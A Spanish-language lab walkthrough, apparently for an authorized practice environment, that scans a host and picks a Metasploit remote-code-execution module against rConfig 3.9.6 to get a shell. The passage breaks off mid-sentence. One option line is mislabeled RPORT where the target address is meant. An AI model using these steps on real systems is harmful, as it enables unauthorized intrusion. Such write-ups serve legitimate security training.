Objetivo: documentar, paso a paso, el razonamiento y comandos clave para obtener una shell en un host Linux que ejecuta rConfig 3.9.6 en un entorno de laboratorio con autorización.

Lanzamos un: 
```
nmap -sC -sV 10.129.201.101
```

Y encontramos:
- **21/tcp FTP** → vsftpd 2.0.8+
- **22/tcp SSH** → OpenSSH 7.4
- **80/tcp HTTP** → Apache 2.4.6 (CentOS) + PHP 7.2.34
- **443/tcp HTTPS** → Apache 2.4.6 (CentOS) + PHP 7.2.34, cert self-signed
- **111/tcp rpcbind**
- **3306/tcp MySQL** (no autorizado)

Con esto podemos hacer una hipótesis, y es que el host es de tipo *web server* que aloja a una aplicación web (HTTP/HTTPS) + base de datos MYSQL.

Accedemos a https://10.129.201.101/ y observamos que utiliza la versión **rCONFIG 3.9.6**, y una búsqueda rápida en google nos dice que este servicio es vulnerable.

Buscando exploits en *msfconsole* del tipo "search exploit rconfig", vemos que muestra algunos PAYLOADS interesantes para servicios http:
```
   7   exploit/linux/http/rconfig_ajaxarchivefiles_rce          2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   8   exploit/linux/http/rconfig_vendors_auth_file_upload_rce  2021-03-17       excellent  Yes    rConfig Vendors Auth File Upload RCE
   9   exploit/unix/webapp/rconfig_install_cmd_exec             2019-10-28       excellent  Yes    rConfig install Command Execution

```
Vamos a utilizar el:
```
use exploit/linux/http/rconfig_ajaxarchivefiles_rce
```
Establecemos:
- RPORT = <ip_máquina_víctima>
- RPORT = 443
OJO! Es muy importante establecer correctamente la IP de la máquina atacante, pues, la que trae por defecto el exploit no sirve.

Una vez lanzado el exploit, capturamos 